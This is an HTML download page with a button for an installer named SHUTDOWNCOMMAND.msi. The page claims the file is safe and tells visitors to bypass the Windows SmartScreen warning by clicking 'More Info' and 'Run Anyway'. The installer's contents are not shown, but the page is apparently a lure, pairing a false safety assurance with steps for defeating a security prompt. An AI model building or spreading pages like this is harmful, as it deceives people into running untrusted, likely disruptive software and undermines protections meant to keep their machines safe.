<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Script</title>
    <!-- Tailwind CSS CDN for styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for the Inter font and overall page aesthetics */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f4f8; /* Light gray background */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh; /* Full viewport height */
            margin: 0;
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-xl shadow-lg text-center max-w-sm w-full">
        <!-- Image added at the top -->
        <img src="sheeet.png" alt="Instructions on how to open a downloaded file"
             class="mb-6 rounded-lg shadow-md w-full h-auto">

        <h1 class="text-2xl font-bold text-gray-800 mb-6">pres da button</h1>
        
        <!--
            The anchor tag acts as the download button.
            'href' points to the file to be downloaded.
            'download' attribute suggests the filename for the user's browser.
            Tailwind classes are used for styling the button.
        -->
        <a href="SHUTDOWNCOMMAND.msi" download="SHUTDOWNCOMMAND.msi"
           class="inline-block bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg
                  transition duration-300 ease-in-out transform hover:scale-105 shadow-md">
            Download script
        </a>

        <!-- Note updated with different colored text -->
        <div class="mt-8 text-left p-4 bg-gray-50 rounded-lg border border-gray-200">
            <p class="text-sm text-gray-700">
                Installer made by Greg, it's safe and it will install some files.
            </p>
            <p class="text-sm text-gray-700 mt-2">
                Click <span class="text-blue-600 font-semibold">Typical</span> to install it. Also, if it shows a blue window, click <span class="text-blue-600 font-semibold">More Info</span> and then <span class="text-blue-600 font-semibold">Run Anyway</span>.
            </p>
        </div>

        <!-- Instructions on how to open the downloaded file -->
        <div class="mt-8 text-left">
            <h2 class="text-xl font-semibold text-gray-700 mb-2">How to Install the File</h2>
            <p class="text-gray-600">
                shown on da picture
            </p>
        </div>
    </div>
</body>
</html>
